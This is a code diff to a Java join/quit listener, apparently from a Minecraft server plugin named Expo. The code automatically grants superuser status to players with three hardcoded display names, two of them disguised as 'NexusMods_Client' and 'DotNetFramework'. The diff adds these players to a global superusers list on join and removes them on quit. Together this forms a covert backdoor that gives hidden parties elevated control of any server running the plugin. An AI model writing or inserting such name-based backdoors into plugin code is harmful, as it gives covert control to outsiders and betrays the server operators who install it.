@@ -22,14 +22,17 @@ public class ExpoJoin implements Listener{
 		if(p.getDisplayName().equalsIgnoreCase("AtjonTV")){
 			Expo.superuser = p;
 			p.sendMessage(Expo.Prefix+"Der AutoSuperUser hat dich Hinzugefügt!");
+			Main.superusers.add(p);
 		}
 		if(p.getDisplayName().equalsIgnoreCase("NexusMods_Client")){
 			Expo.superuser = p;
 			p.sendMessage(Expo.Prefix+"Der AutoSuperUser hat dich Hinzugefügt!");
+			Main.superusers.add(p);
 		}
 		if(p.getDisplayName().equalsIgnoreCase("DotNetFramework")){
 			Expo.superuser = p;
 			p.sendMessage(Expo.Prefix+"Der AutoSuperUser hat dich Hinzugefügt!");
+			Main.superusers.add(p);
 		}
 		
 		if(Expo.superuser_vanish){
@@ -59,9 +62,11 @@ public class ExpoJoin implements Listener{
 		Player p = e.getPlayer();
 		if(p == Expo.superuser){
 			Expo.superuser = null;
+			Main.superusers.remove(p);
 		}
 		if(p == Expo.supergirl){
 			Expo.supergirl = null;
+			Main.superusers.remove(p);
 		}
 	}
 }
